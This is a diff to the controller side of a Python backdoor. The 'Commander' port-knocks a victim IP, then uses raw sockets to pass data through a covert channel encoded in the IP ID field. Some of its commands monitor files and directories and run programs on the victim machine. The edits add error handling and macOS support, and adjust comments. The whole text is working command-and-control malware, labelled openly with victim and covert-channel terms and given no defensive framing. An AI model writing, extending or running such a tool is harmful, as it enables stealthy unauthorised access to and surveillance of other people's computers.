@@ -7,18 +7,18 @@ import time
 # Commander configuration
 VICTIM_IP = "192.168.1.4"  # Target victim IP address (change as appropriate)
 KNOCK_SEQUENCE = [12345, 23456, 34567]  # Port knocking sequence (example)
-COVERT_UDP_PORT = 40000  # The UDP port on victim used for covert channel
+COVERT_UDP_PORT = 40000  # The UDP port on a victim used for a covert channel
 
 # Timeouts
-RECV_TIMEOUT = 5.0  # seconds to wait for a response from victim
+RECV_TIMEOUT = 5.0  # seconds to wait for a response from a victim
 
 class Commander:
     def __init__(self):
-        self.sock = None  # Raw socket for covert channel
+        self.sock = None  # Raw socket for a covert channel
         self.connected = False
 
     def port_knock(self):
-        """Perform port knocking to initiate session with victim."""
+        """Perform port knocking to initiate session with a victim."""
         print("[*] Sending port knock sequence to victim...")
         for port in KNOCK_SEQUENCE:
             try:
@@ -33,37 +33,41 @@ class Commander:
             finally:
                 s.close()
             time.sleep(0.1)  # small delay between knocks
-        # After knocking, initialize covert channel socket
+        # After knocking, initialize a covert channel socket
         self.start_covert_channel()
-        # Optionally, we could wait for a specific "ack" from victim.
-        # For simplicity, we'll assume connection established if victim responds to first command.
+        # Optionally, we could wait for a specific "ack" from a victim.
+        # For simplicity, we'll assume a connection established if a victim responds to the first command.
         print("[*] Knock sequence sent. Attempting to establish covert channel...")
 
     def start_covert_channel(self):
         """Initialize the raw socket for covert communication."""
-        # Create a raw socket for IP (protocol will be set per packet in send)
-        if platform.system() == "Darwin":
-            proto = socket.IPPROTO_RAW
-        else:
-            proto = socket.IPPROTO_UDP
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
-        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        # Optional: We could bind to a specific interface or local IP if needed.
-        # Set a timeout for receiving to avoid blocking indefinitely
-        self.sock.settimeout(RECV_TIMEOUT)
+        try:
+            if platform.system() == "Darwin":
+                proto = socket.IPPROTO_RAW
+            else:
+                proto = socket.IPPROTO_UDP
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
+            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            self.sock.settimeout(RECV_TIMEOUT)
+        except PermissionError:
+            print("[!] Permission denied: Raw sockets require root privileges.")
+            exit(1)
+        except Exception as e:
+            print(f"[!] Failed to create raw socket: {e}")
+            exit(1)
 
     def send_covert_message(self, data_bytes):
-        """Send a message (bytes) to victim via covert channel (IP ID field encoding)."""
+        """Send a message (bytes) to a victim via a covert channel (IP ID field encoding)."""
         if not self.sock:
             raise RuntimeError("Raw socket is not initialized")
         # Prepend 2-byte length (big-endian)
         length = len(data_bytes)
         header = struct.pack(">H", length)
         message = header + data_bytes
-        # Pad message to even length for 2-byte chunks
+        # Pad a message to even length for 2-byte chunks
         if len(message) % 2 != 0:
             message += b'\x00'
-        # Send each 2-byte chunk in IP ID field
+        # Send each 2-byte chunk in the IP I D field
         for i in range(0, len(message), 2):
             chunk = message[i:i+2]
             # Convert chunk to 16-bit integer
@@ -103,12 +107,15 @@ class Commander:
             # Final packet
             packet = ip_header + udp_header
             # Send the raw packet
-            self.sock.sendto(packet, (dst_ip, 0))  # 0 for port is ignored because IP_HDRINCL
+            if platform.system() == "Darwin":
+                self.sock.sendto(packet, (dst_ip, 1))
+            else:
+                self.sock.sendto(packet, (dst_ip, 0))  # 0 for port is ignored because IP_HDRINCL
         # Small delay to ensure packets are sent out before possibly sending next
         time.sleep(0.05)
 
     def recv_covert_message(self):
-        """Receive a covert message from victim. Reassembles from IP ID field."""
+        """Receive a covert message from a victim. Reassembles from IP ID field."""
         if not self.sock:
             raise RuntimeError("Raw socket not initialized")
         # We will loop reading packets until we have a full message
@@ -275,7 +282,7 @@ def cmd_monitor_file(comm: Commander):
         print("[Victim]:", resp.decode())
     else:
         print("[*] Monitor command sent. No immediate response.")
-    # In this implementation, victim logs events internally.
+    # In this implementation, a victim logs events internally.
     # User can later fetch the log if needed via normal file download.
 
 def cmd_monitor_dir(comm: Commander):
@@ -304,6 +311,8 @@ def cmd_run_program(comm: Commander):
         print("-----[ Program Output ]-----")
         print(output)
         print("----------[ End ]----------")
+
+comm = None
 
 def main():
     comm = Commander()
@@ -382,5 +391,5 @@ if __name__ == "__main__":
         main()
     except KeyboardInterrupt:
         print("\n[!] Commander terminated by user.")
-        if 'comm' in locals():
+        if 'comm' in locals() and comm is not None:
             comm.disconnect()
